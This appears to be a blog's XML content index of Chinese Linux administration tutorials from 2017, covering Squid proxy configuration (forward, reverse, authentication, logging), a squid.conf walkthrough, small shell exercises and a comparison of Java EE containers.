10.0.0.0/8 # RFC1918 possible internal networkacl localnet src 172.16.0.0/12 # RFC1918 possible internal networkacl localnet src 192.168.0.0/16 # RFC1918 possible internal networkacl SSL_ports port 443acl Safe_ports port 80 8080 # httpacl Safe_ports port 21 # ftpacl Safe_ports port 443 # httpsacl CONNECT method CONNECThttp_access allow manager localhosthttp_access deny managerhttp_access deny !Safe_portshttp_access deny CONNECT !SSL_portshttp_access allow localnethttp_access allow localhosthttp_access deny allcache_dir aufs /data/cache 1024 16 256cache_mem 128 MBhierarchy_stoplist cgi-bin ?coredump_dir /var/spool/squidrefresh_pattern ^ftp: 1440 20% 10080refresh_pattern ^gopher: 1440 0% 1440refresh_pattern -i (/cgi-bin/|\?) 0 0% 0refresh_pattern \.(jpg|png|gif|mp3|xml) 1440 50% 2880 ignore-reloadrefresh_pattern . 0 20% 4320 3.创建缓存目录，并修改权限1mkdir /data/cahce; chown -R squid:squid /data/cache 4.初始化缓存目录1squid -z 5.启动squid1service squid start 6.打开端口转发1echo "1" &gt; /proc/sys/net/ipv4/ip_forward 7. 设置防火墙规则12iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADEiptables -t nat -A PREROUTING -p tcp -s 192.168.19.0/24 --dport 80 -j REDIRECT --to-ports 3128]]></content>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[squid 日志不记录图片、js、css等静态文件]]></title>
    <url>%2F2017%2F08%2F10%2FSquid%2F7.%20squid%20%E6%97%A5%E5%BF%97%E4%B8%8D%E8%AE%B0%E5%BD%95%E5%9B%BE%E7%89%87%E3%80%81js%E3%80%81css%E7%AD%89%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[squid 日志不记录图片、js、css等静态文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在squid.conf中加入： 12acl nolog urlpath_regex -i \.css \.js \.swf \.jpg \.gif \.png \.jpegaccess_log /var/log/squid/access.log common !nolog &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中common 为日志格式]]></content>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[squid代理加用户认证]]></title>
    <url>%2F2017%2F08%2F10%2FSquid%2F9.%20squid%E4%BB%A3%E7%90%86%E5%8A%A0%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81%2F</url>
    <content type="text"><![CDATA[squid代理加用户认证&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用authentication helpers添加身份验证 有如下几种认证方式 ：12345678=&gt; NCSA: Uses an NCSA-style username and password file.=&gt; LDAP: Uses the Lightweight Directory Access Protocol=&gt; MSNT: Uses a Windows NT authentication domain.=&gt; PAM: Uses the Linux Pluggable Authentication Modules scheme.=&gt; SMB: Uses a SMB server like Windows NT or Samba.=&gt; getpwam: Uses the old-fashioned Unix password file.=&gt; SASL: Uses SALS libraries.=&gt; NTLM, Negotiate and Digest authentication 配置NCSA 认证一、创建认证用户名/密码，用htpasswd1htpasswd /etc/squid/passwd user1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输入密码 12New password:Re-type new password: 二、确定squid是否支持authentication helper&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;yum 安装的 1rpm -ql squid | grep ncsa_auth &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1/usr/lib64/squid/ncsa_auth 三、配置SQUID认证1vi /etc/squid/squid.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入验证部分内容： 12345auth_param basic program /usr/lib64/squid/ncsa_auth /etc/squid/passwd //定义squid密码文件与ncsa_auth文件位置auth_param basic children 15 //认证进程的数量auth_param basic realm Squid proxy-caching web serverauth_param basic credentialsttl 2 hours //认证有效期auth_param basic casesensitive off //用户名不区分大小写，可改为ON区分大小写 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加 acl 验证用户： 12acl ncsa_users proxy_auth REQUIREDhttp_access allow ncsa_users 四、重启squid生效1# /etc/init.d/squid restart]]></content>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[四大Java EE容器(Tomcat、JBoss、Resin、Glassfish)之简单比较]]></title>
    <url>%2F2017%2F08%2F10%2FTomcat%2F5.%20%E5%9B%9B%E5%A4%A7Java%20EE%E5%AE%B9%E5%99%A8(Tomcat%E3%80%81JBoss%E3%80%81Resin%E3%80%81Glassfish)%E4%B9%8B%E7%AE%80%E5%8D%95%E6%AF%94%E8%BE%83%2F</url>
    <content type="text"><![CDATA[四大Java EE容器(Tomcat、JBoss、Resin、Glassfish)之简单比较&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在流行的Java EE容器有很多：Tomcat、JBoss、Resin、Glassfish等等。下面对这四种Java EE容器进行了一番简单的比对。 1. Tomcat是Apache鼎力支持的Java Web应用服务器，由于它优秀的稳定性以及丰富的文档资料，广泛的使用人群，从而在开源领域受到最广泛的 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在流行的Java EE容器有很多：Tomcat、JBoss、Resin、Glassfish等等。下面对这四种Java EE容器进行了一番简单的比对。 Tomcat是Apache鼎力支持的Java Web应用服务器(注：servlet容器)，由于它优秀的稳定性以及丰富的文档资料，广泛的使用人群，从而在开源领域受到最广泛的青睐。 Jboss作为Java EE应用服务器，它不但是Servlet容器，而且是EJB容器，从而受到企业级开发人员的欢迎，从而弥补了Tomcat只是一个Servlet容器的缺憾。 Resin也仅仅是一个Servlet容器，然而由于它优秀的运行速度，使得它在轻量级Java Web领域备受喜爱，特别是在互联网Web服务领域，众多知名公司都采用其作为他们的Java Web应用服务器，譬如163、ku6等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在商用应用服务器里主要有：Weblogic、Websphere,其中Weblogic我也使用过很长一段时间，当时也只用其当Servlet容器，然而就在同等条件下，在性能及易用性等方面，要比Tomcat优秀很多。 glassfish是Sun公司推出的Java EE服务器(Java EE容器)，一个比较活跃的开源社区，不断的通过社区的反馈来提高其的可用性，经过glassfish v1 glassfish v2 到今天的glassfish v3 ,它已经走向成熟。Glassfish是一个免费、开放源代码的应用服务，它实现了Java EE 5,Java EE 5 平台包括了以下最新技术：EJB 3.0、JSF 1.2、Servlet 2.5、JSP 2.1、JAX-WS 2.0、JAXB 2.0、 Java Persistence 1.0、Common Annonations 1.0、StAX 1.0等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;支持集群，通过内存中会话状态复制，增强了部署体系结构的可用性与可伸缩性，它对集群有着很好的支持，可以简单到通过添加机器，就可轻松的提高网站的 带负载能力，在解析能力方面，它对html的吞吐能力与apache服务器不分上下，就是tomcat所不能比的，支持目录部署，热部署，解决了 tomcat对热部署能力的缺陷。在版本方面做的更加人性化，有开发时用的简化版，专门用于部署web项目的版本，还要完全符合j2ee标准的版本。]]></content>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习2]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A02%2F</url>
    <content type="text"><![CDATA[抓包 ip 访问日志 /var/log/1.log 然后进行系统分析：要求统计出每个 IP 的访问量有多少？提示，先 awk 过滤出 ip ，然后进行排序，统计重复数 12#!/bin/bashawk '&#123;print $1&#125;' /var/log/1.log |sort -n|uniq -c|sort-rn]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[squid日志详解]]></title>
    <url>%2F2017%2F08%2F10%2FSquid%2F12.%20squid%E6%97%A5%E5%BF%97%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[squid日志详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;squid的日志很重要。常常要了解的，其中最重要的就是命中率啦，不然反向代理做的用就不大。 12345678910111213141516cat access.log|gawk ‘&#123;print $4&#125;’|sort|uniq -c|sort -nr9568 TCP_IMS_HIT/3046313 TCP_HIT/2002133 TCP_MISS/2001568 TCP_MISS/206587 TCP_MEM_HIT/200531 TCP_MISS/304207 TCP_REFRESH_HIT/200152 TCP_REFRESH_HIT/30486 TCP_NEGATIVE_HIT/40469 TCP_MISS/4049 TCP_MISS/0004 TCP_MISS/5031 TCP_REFRESH_MISS/0001 TCP_DENIED/400 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以使用上面的方法，大约的分析一下命令中比。什么意思就看下面的详解. 1cat /var/log/squid/access.log |grep TCP_MEM_HIT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果看到很多的TCP_MEM_HIT ，这表明该文件是从内存缓存读取的，squid已经起作用了！你再用浏览器打开该文件，应该是快如闪电了。。呵呵，大功告成了！还有其他类型的HIT，如TCP_HIT等等，这些是从磁盘读取的，我觉得加速的意义不大，只不过缓解了apache的压力而已。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;相应于HTTP请求，下列标签可能出现在access.log文件的第四个域。 TCP_HIT ：Squid发现请求资源的貌似新鲜的拷贝，并将其立即发送到客户端。 TCP_MISS ：Squid没有请求资源的cache拷贝。 TCP_REFERSH_HIT ：Squid发现请求资源的貌似陈旧的拷贝，并发送确认请求到原始服务器。原始服务器返回304（未修改）响应，指示squid的拷贝仍旧是新鲜的。 TCP_REF_FAIL_HIT ：Squid发现请求资源的貌似陈旧的拷贝，并发送确认请求到原始服务器。然而，原始服务器响应失败，或者返回的响应Squid不能理解。在此情形下，squid发送现有cache拷贝（很可能是陈旧的）到客户端。 TCP_REFRESH_MISS ：Squid发现请求资源的貌似陈旧的拷贝，并发送确认请求到原始服务器。原始服务器响应新的内容，指示这个cache拷贝确实是陈旧的。 TCP_CLIENT_REFRESH_MISS ：Squid发现了请求资源的拷贝，但客户端的请求包含了Cache-Control: no-cache指令。Squid转发客户端的请求到原始服务器，强迫cache确认。 TCP_IMS_HIT ：客户端发送确认请求，Squid发现更近来的、貌似新鲜的请求资源的拷贝。Squid发送更新的内容到客户端，而不联系原始服务器。 TCP_SWAPFAIL_MISS ：Squid发现请求资源的有效拷贝，但从磁盘装载它失败。这时squid发送请求到原始服务器，就如同这是个cache丢失一样。 TCP_NEGATIVE_HIT ：在对原始服务器的请求导致HTTP错误时，Squid也会cache这个响应。在短时间内对这些资源的重复请求，导致了否命中。 negative_ttl指令控制这些错误被cache的时间数量。请注意这些错误只在内存cache，不会写往磁盘。下列HTTP状态码可能导致否定 cache（也遵循于其他约束）： 204, 305, 400, 403, 404, 405, 414, 500, 501, 502, 503, 504。 TCP_MEM_HIT ：Squid在内存cache里发现请求资源的有效拷贝，并将其立即发送到客户端。注意这点并非精确的呈现了所有从内存服务的响应。例如，某些cache在内存里，但要求确认的响应，会以TCP_REFRESH_HIT, TCP_REFRESH_MISS等形式记录。 TCP_DENIED ：因为http_access或http_reply_access规则，客户端的请求被拒绝了。注意被http_access拒绝的请求在第9域的值是NONE/-，然而被http_reply_access拒绝的请求，在相应地方有一个有效值。 TCP_OFFLINE_HIT ：当offline_mode激活时，Squid对任何cache响应返回cache命中，而不用考虑它的新鲜程度。 TCP_REDIRECT ：重定向程序告诉Squid产生一个HTTP重定向到新的URI（见11.1节）。正常的，Squid不会记录这些重定向。假如要这样做，必须在编译squid前，手工定义LOG_TCP_REDIRECTS预处理指令。 NONE :无分类的结果用于特定错误，例如无效主机名。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;相应于ICP查询，下列标签可能出现在access.log文件的第四域。 UDP_HIT :Squid在cache里发现请求资源的貌似新鲜的拷贝。 UDP_MISS ：Squid没有在cache里发现请求资源的貌似新鲜的拷贝。假如同一目标通过HTTP请求，就可能是个cache丢失。请对比UDP_MISS_NOFETCH。 UDP_MISS_NOFETCH ：跟UDP_MISS类似，不同的是这里也指示了Squid不愿去处理相应的HTTP请求。假如使用了-Y命令行选项，Squid在启动并编译其内存索引时，会返回这个标签而不是UDP_MISS。 UDP_DENIED ：因为icp_access规则，ICP查询被拒绝。假如超过95%的到某客户端的ICP响应是UDP_DENIED，并且客户端数据库激活了（见附录A），Squid在1小时内，停止发送任何ICP响应到该客户端。若这点发生，你也可在cache.log里见到一个警告。 UDP_INVALID ：Squid接受到无效查询（例如截断的消息、无效协议版本、URI里的空格等）。Squid发送UDP_INVALID响应到客户端]]></content>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Squid.conf配置文件详解]]></title>
    <url>%2F2017%2F08%2F10%2FSquid%2F5.%20Squid.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Squid.conf配置文件详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;squid常用命令： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187/usr/local/squid/sbin/squid -z 初始化缓存空间/usr/local/squid/sbin/squid 启动/usr/local/squid/sbin/squid -k shutdown 停止/usr/local/squid/sbin/squid -k reconfigure 重新载入配置文件/usr/local/squid/sbin/squid -k rotate 轮循日志#acl all src 0.0.0.0/0.0.0.0 and http_access allow all选项定义了一个访问控制列表。详细情况参见和Squid软件#携带的文档。这里的访问控制列表允许所有对代理服务的访问，因为这里该代理是加速web服务器。acl all src 0.0.0.0/0.0.0.0 #允许所有IP访问acl manager proto http #manager url协议为httpacl localhost src 127.0.0.1/255.255.255.255 #允午本机IPacl to_localhost dst 127.0.0.1 #允午目的地址为本机IPacl Safe_ports port 80 # 允许安全更新的端口为80acl CONNECT method CONNECT #请求方法以CONNECThttp_access allow all #允许所有人使用该代理.因为这里是代理加速web服务器http_reply_access allow all #允许所有客户端使用该代理acl OverConnLimit maxconn 16 #限制每个IP最大允许16个连接，防止攻击http_access deny OverConnLimiticp_access deny all #禁止从邻居服务器缓冲内发送和接收ICP请求.miss_access allow all #允许直接更新请求ident_lookup_access deny all #禁止lookup检查DNShttp_port 8080 transparent #指定Squid监听浏览器客户请求的端口号。hierarchy_stoplist cgi-bin ? #用来强制某些特定的对象不被缓存，主要是处于安全的目的。acl QUERY urlpath_regex cgi-bin ?cache deny QUERYcache_mem 1 GB #这是一个优化选项，增加该内存值有利于缓存。应该注意的是： #一般来说如果系统有内存，设置该值为(n/)3M。现在是3G 所以这里1Gfqdncache_size 1024 #FQDN 高速缓存大小maximum_object_size_in_memory 2 MB #允许最大的文件载入内存memory_replacement_policy heap LFUDA #动态使用最小的，移出内存cachecache_replacement_policy heap LFUDA #动态使用最小的，移出硬盘cachecache_dir ufs /home/cache 5000 32 512 #高速缓存目录 ufs 类型 使用的缓冲值最大允午1000MB空间，#32个一级目录，512个二级目录max_open_disk_fds 0 #允许最大打开文件数量,0 无限制minimum_object_size 1 KB #允午最小文件请求体大小maximum_object_size 20 MB #允午最大文件请求体大小cache_swap_low 90 #最小允许使用swap 90%cache_swap_high 95 #最多允许使用swap 95%ipcache_size 2048 # IP 地址高速缓存大小 2Mipcache_low 90 #最小允许ipcache使用swap 90%ipcache_high 95 #最大允许ipcache使用swap 90%access_log /var/log/squid/access.log squid #定义日志存放记录cache_log /var/log/squid/cache.log squidcache_store_log none #禁止store日志emulate_httpd_log on #将使Squid仿照Web服务器的格式创建访问记录。如果希望使用 #Web访问记录分析程序，就需要设置这个参数。refresh_pattern . 0 20% 4320 override-expire override-lastmod reload-into-ims ignore-reload #更新cache规则acl buggy_server url_regex ^http://.... http:// #只允许http的请求broken_posts allow buggy_serveracl apache rep_header Server ^Apache #允许apache的编码broken_vary_encoding allow apacherequest_entities off #禁止非http的标分准请求，防止攻击header_access header allow all #允许所有的http报头relaxed_header_parser on #不严格分析http报头.client_lifetime 120 minute #最大客户连接时间 120分钟cache_mgr sky@test.com #指定当缓冲出现问题时向缓冲管理者发送告警信息的地址信息。cache_effective_user squid #这里以用户squid的身份Squid服务器cache_effective_group squidicp_port 0 #指定Squid从邻居服务器缓冲内发送和接收ICP请求的端口号。 #这里设置为0是因为这里配置Squid为内部Web服务器的加速器， #所以不需要使用邻居服务器的缓冲。0是禁用# cache_peer 设置允许更新缓存的主机，因是本机所以127.0.0.1cache_peer 127.0.0.1 parent 80 0 no-query default multicast-responder no-netdb-exchangecache_peer_domain 127.0.0.1 hostname_aliases 127.0.0.1error_directory /usr/share/squid/errors/Simplify_Chinese #定义错误路径always_direct allow all # cache丢失或不存在是允许所有请求直接转发到原始服务器ignore_unknown_nameservers on #开反DNS查询，当域名地址不相同时候，禁止访问coredump_dir /var/log/squid #定义dump的目录max_filedesc 2048 #最大打开的文件描述half_closed_clients off #使Squid在当read不再返回数据时立即关闭客户端的连接。 #有时read不再返回数据是由于某些客户关闭TCP的发送数据 #而仍然保持接收数据。而Squid分辨不出TCP半关闭和完全关闭。buffered_logs on #若打开选项“buffered_logs”可以稍稍提高加速某些对日志文件的写入，该选项主要是实现优化特性。#防止天涯盗链，转嫁给百度acl tianya referer_regex -i tianyahttp_access deny tianyadeny_info tianya#阻止baidu蜘蛛acl baidu req_header User-Agent Baiduspiderhttp_access deny baidu#限制同一IP客户端的最大连接数acl OverConnLimit maxconn 128http_access deny OverConnLimit#防止被人利用为HTTP代理，设置允许访问的IP地址acl myip dst 222.18.63.37http_access deny !myip#允许本地管理acl Manager proto cache_objectacl Localhost src 127.0.0.1 222.18.63.37http_access allow Manager Localhostcachemgr_passwd 53034338 allhttp_access deny Manager#仅仅允许80端口的代理acl all src 0.0.0.0/0.0.0.0acl Safe_ports port 80 # httphttp_access deny !Safe_portshttp_access allow all#Squid信息设置visible_hostname happy.swjtu.edu.cncache_mgr ooopic2008@qq.com#基本设置cache_effective_user squidcache_effective_group squidtcp_recv_bufsize 65535 bytes#2.6的反向代理加速配置cache_peer 127.0.0.1 parent 80 0 no-query originserver#错误文档error_directory /usr/local/squid/share/errors/Simplify_Chinese#单台使用，不使用该功能icp_port 0hierarchy_stoplist cgi-bin ?acl QUERY urlpath_regex cgi-bin ? .php .cgi .avi .wmv .rm .ram .mpg .mpeg .zip .execache deny QUERYacl apache rep_header Server ^Apachebroken_vary_encoding allow apacherefresh_pattern ^ftp: 1440 20% 10080refresh_pattern ^gopher: 1440 0% 1440refresh_pattern . 0 20% 4320cache_store_log nonepid_filename /usr/local/squid/var/logs/squid.pidemulate_httpd_log onlogformat combined %&gt;a %ui %un [%tl] "%rm %ru HTTP/%rv" %Hs %&lt;st "%&#123;Referer&#125;&gt;h" "%&#123;User-Agent&#125;&gt;h" %Ss:%Shcache_log /usr/local/squid/var/logs/cache.logaccess_log /usr/local/squid/var/logs/access.log combinedcoredump_dir /usr/local/squid/var/cachecache_dir ufs /usr/local/squid/var/cache 10000 16 256dns_children 32hosts_file /etc/hostscache_mem 400 MBcache_swap_low 90cache_swap_high 95maximum_object_size 32768 KBmaximum_object_size_in_memory 4096 KBemulate_httpd_log on#防止盗链acl picurl url_regex -i .bmp$ .png$ .jpg$ .gif$ .jpeg$acl mystie1 referer_regex -i happy.swjtu.edu.cnhttp_access allow mystie1 picurlacl nullref referer_regex -i ^$http_access allow nullrefacl hasref referer_regex -i .+http_access deny hasref picurl]]></content>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习3]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A03%2F</url>
    <content type="text"><![CDATA[ps 可以查看进程的内存占用大小，写一个脚本计算一下所有进程所占用内存大小的和。（提示，使用ps aux 列出所有进程，过滤出RSS那列，然后求和） 1234567#! /bin/bashsum=0for mem in `ps aux |awk '&#123;print $6&#125;' |grep -v 'RSS'`do sum=$[$sum+$mem]doneecho "The total memory is $sum""k" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以一条 awk 命令完成 1ps aux|awk '&#123;print $6&#125;'|awk '&#123;(sum=sum+$1)&#125;;END&#123;print sum&#125;']]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[squid正向代理]]></title>
    <url>%2F2017%2F08%2F10%2FSquid%2F2.%20squid%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[squid正向代理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;centos 系统自带 squid 包： 1[root@192 ~]# yum install -y squid &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然也可以源码包编译安装，Squid官方网站，以下为 squid 编译参数 12345678910111213141516171819202122232425262728./configure --prefix=/usr/local/squid \--disable-dependency-tracking \--enable-dlmalloc \--enable-gnuregex \--disable-carp \--enable-async-io=240 \--with-pthreads \--enable-storeio=ufs,aufs,diskd,null \--disable-wccp \--disable-wccpv2 \--enable-kill-parent-hack \--enable-cachemgr-hostname=localhost \--enable-default-err-language=Simplify_Chinese \--with-build-environment=POSIX_V6_ILP32_OFFBIG \--with-maxfd=65535 \--with-aio \--disable-poll \--enable-epoll \--enable-linux-netfilter \--enable-large-cache-files \--disable-ident-lookups \--enable-default-hostsfile=/etc/hosts \--with-dl \--with-large-files \--enable-removal-policies=heap,lru \--enable-delay-pools \--enable-snmp \--disable-internal-dns &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 centos 自带的 squid 已经满足需求，所以没必要编译安装。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装完成后，可以查看 squid 版本： 12[root@192 ~]# squid -vSquid Cache: Version 3.1.23 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同时还可以看到 squid 的编译参数。下面配置 squid，来实现正向代理： 12[root@192 ~]# rm -f /etc/squid/squid.conf[root@192 ~]# vim /etc/squid/squid.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不实用默认的配置文件，删除以后重新写入以下配置： 12345678910111213141516171819202122232425262728http_port 3128acl manager proto cache_objectacl localhost src 127.0.0.1/32 ::1acl to_localhost dst 127.0.0.0/8 0.0.0.0/32 ::1acl localnet src 10.0.0.0/8 # RFC1918 possible internal networkacl localnet src 172.16.0.0/12 # RFC1918 possible internal networkacl localnet src 192.168.0.0/16 # RFC1918 possible internal networkacl SSL_ports port 443acl Safe_ports port 80 8080 # httpacl Safe_ports port 21 # ftpacl Safe_ports port 443 # httpsacl CONNECT method CONNECThttp_access allow manager localhosthttp_access deny managerhttp_access deny !Safe_portshttp_access deny CONNECT !SSL_portshttp_access allow localnethttp_access allow localhosthttp_access allow allcache_dir aufs /data/cache 1024 16 256cache_mem 128 MBhierarchy_stoplist cgi-bin ?coredump_dir /var/spool/squidrefresh_pattern ^ftp: 1440 20% 10080refresh_pattern ^gopher: 1440 0% 1440refresh_pattern -i (/cgi-bin/|\?) 0 0% 0refresh_pattern \.(jpg|png|gif|mp3|xml) 1440 50% 2880 ignore-reloadrefresh_pattern . 0 20% 4320 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置文件中，第一行的 “http_port 3128” 这个指的是，squid 服务启动后将要监听的端口，也可以是 80 。“cache_dir” 这个用来指定本地磁盘上的缓存目录，后边的1024为大小，单位是 M 具体根据磁盘大小决定。“cache_mem”它用来规定缓存占用内存的大小，即把缓存的东西存到内存里，具体也需要根据机器的内存定，如果只跑 squid 服务，那么留给系统 512M 内存外，其他可以都分给 squid。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置文件保存后，可以先检测一下是否有语法错误： 12[root@192 ~]# squid -kchecksquid: ERROR: No running copy &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果提示 1squid: ERROR: No running copy &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是 squid 还未启动，不过没有关系，显示成这样说明配置文件没有问题了。在启动前还得初始化缓存目录： 123456789101112131415161718192021[root@192 ~]# mkdir /data/cache[root@192 ~]# chown -R squid:squid /data/cache[root@192 ~]# squid -z2017/03/30 20:36:42| Creating Swap Directories2017/03/30 20:36:42| /data/cache exists2017/03/30 20:36:42| Making directories in /data/cache/002017/03/30 20:36:42| Making directories in /data/cache/012017/03/30 20:36:42| Making directories in /data/cache/022017/03/30 20:36:42| Making directories in /data/cache/032017/03/30 20:36:42| Making directories in /data/cache/042017/03/30 20:36:42| Making directories in /data/cache/052017/03/30 20:36:42| Making directories in /data/cache/062017/03/30 20:36:42| Making directories in /data/cache/072017/03/30 20:36:42| Making directories in /data/cache/082017/03/30 20:36:42| Making directories in /data/cache/092017/03/30 20:36:42| Making directories in /data/cache/0A2017/03/30 20:36:42| Making directories in /data/cache/0B2017/03/30 20:36:42| Making directories in /data/cache/0C2017/03/30 20:36:42| Making directories in /data/cache/0D2017/03/30 20:36:42| Making directories in /data/cache/0E2017/03/30 20:36:42| Making directories in /data/cache/0F &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;初始化完成后，就可以启动 squid 了： 12[root@192 ~]# /etc/init.d/squid start正在启动 squid：. [确定] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看 squid 是否启动： 1[root@192 ~]# ps aux | grep squid &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在可以在真机上测测看 squid 的正向代理了，需要设置 IE 选项，或者直接用 curl 命令测试： 1[root@192 ~]# curl -xlocalhost:3128 http://www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果看到这样一大串，说明 squid 正向代理设置 OK 了，另外也可以观察 squid 对图片的缓存 1[root@192 ~]# curl -xlocalhost:3128 http://www.aminglinux.com/bbs/static/image/common/logo.png -I 1[root@192 ~]# curl -xlocalhost:3128 http://www.aminglinux.com/bbs/static/image/common/logo.png -I &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;连续访问两次论坛的 logo 图片，可以发现前后两次的不同，其中“X-Cache-Lookup: HIT from 192.168.0.73:3128”显示，该请求已经 HIT ，它直接从本地的3128端口获取了数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候还有这样的需求，就是想限制某些域名不能通过代理访问，或者说只想代理某几个域名，在 squid.conf 中找到： 1acl CONNECT method CONNECT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在其下面添加四行： 1234acl http proto HTTPacl good_domain dstdomain .apelearn.com .aminglinux.comhttp_access allow http good_domainhttp_access deny http !good_domain &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中白名单域名为“.apelearn.com .aminglinux.com”，这里的 . 表示万能匹配。前面可以是任何字符，只需要填写白名单域名即可。重启 squid 再来测测： 12[root@192 ~]# /etc/init.d/squid restart[root@192 ~]# curl -xlocalhost:3128 http://www.baidu.com/ -I &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;访问百度已经变为403了，如果要设置黑名单，道理是一样的 1234acl http proto HTTPacl bad_domain dstdomain .sina.com .souhu.comhttp_access allow http !bad_domainhttp_access deny http bad_domain &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启 squid 后，测试： 123[root@192 ~]# /etc/init.d/squid restart [root@192 ~]# curl -xlocalhost:3128 http://www.sina.com/ -I[root@192 ~]# curl -xlocalhost:3128 http://www.baidu.com/ -I &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;baidu.com 可以访问，而 sina.com 不可以访问了]]></content>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[squid反向代理]]></title>
    <url>%2F2017%2F08%2F10%2FSquid%2F3.%20squid%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[squid反向代理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;反向代理的配置过程和正向代理没有什么太大区别，唯一的区别是配置文件中一个地方需要改动一下，需要把 1[root@192 ~]# vim /etc/squid/squid.conf 1http_port 3128 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;改为 1http_port 80 accel vhost vport &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后在增加要代理的后端真实服务器信息： 1234cache_peer 182.140.167.44 parent 80 0 originserver name=acache_peer 180.97.33.108 parent 80 0 originserver name=bcache_peer_domain a www.qq.comcache_peer_domain b www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为之前没有配置网站信息，所以用qq.com和 baidu.com 来做例子。其中 cache_peer 为配置后端的服务器 IP 以及端口，name 后边为要配置的域名，这里和后面的 cache_peer_domain 相对应。实际的应用中，ip 大多为内外 ip ，而域名也许会有多个，如果是 squid 要代理一台 web 上的所有域名，那么就要写成这样： 1cache_peer 192.168.10.111 80 0 originserver &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;后面连 cache_peer_domain 也省了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;反向代理主要用于缓存静态项，因为诸多静态项目尤其是图片、流媒体等比较耗费宽带，如果网络资源本来就慢，再去访问大流量的的图片、流媒体那更慢了，所以如果配置一个 squid 反向代理，让客户直接访问这个 squid ，而这些静态项已经被缓存在了 squid 上，这样就大大加快了访问速度。CDN 的设计原理就是这样的思路。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为修改了配置文件，所以需要重启一下 squid ： 1234[root@192 ~]# /etc/init.d/squid restart[root@192 ~]# curl -xlocalhost:80 http://www.baidu.com/ -I[root@192 ~]# curl -xlocalhost:80 http://www.qq.com/ -I[root@192 ~]# curl -xlocalhost:80 http://www.sina.com/ -I 